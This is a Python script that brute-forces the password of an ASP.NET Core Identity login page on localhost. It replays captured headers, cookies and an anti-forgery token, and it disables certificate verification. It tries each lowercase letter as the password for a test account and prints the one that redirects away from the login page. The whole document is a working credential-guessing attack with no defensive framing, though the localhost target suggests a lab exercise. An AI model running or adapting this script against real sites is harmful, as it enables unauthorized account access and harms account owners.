import requests

headers = {
    'authority': 'localhost:44302',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '^\\^',
    'sec-ch-ua-mobile': '?0',
    'upgrade-insecure-requests': '1',
    'origin': 'https://localhost:44302',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://localhost:44302/Identity/Account/Login',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': '.AspNet.Consent=yes; .AspNetCore.Antiforgery.mNoPF8IPbFA=CfDJ8Kpe-Uap5WZLhY3NPreX6A-OhKPw1GZUuMfGFSn1DZ8AhrslaluFHDjZ3fk8iafLw6ufruAG7dg9wZ8MpFMLYg4A-4CpKJmPFrYzDUKEjnWHqkE1zPmqsAwkg6jTybss33kbws2eyRZNS1ip0psP3hw',
}

data = {
  'Input.Email': 'test@test.test',
  '__RequestVerificationToken': 'CfDJ8Kpe-Uap5WZLhY3NPreX6A-gHK3PBGbqrp01U2-rqd4H8vgFb_UNqrpDtlLpQC2JoSZUr_HwrNUXXiV4lxokhBSY0N0GJSB1FgWZTmQsDQZYeOKq4ODkNOePYUoIsrnZI0RI3I3ABYa0zjekdrAJmcU',
  'Input.RememberMe': 'false'
}

alphabet = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]

for x in alphabet:
    data['Input.Password'] = x
    response = requests.post('https://localhost:44302/Identity/Account/Login', headers=headers, data=data, verify=False)
    url_length = len(response.url)
    last_part = response.url[(url_length - 5):url_length]
    if last_part != "Login":
        print("The password is: " + x)
        break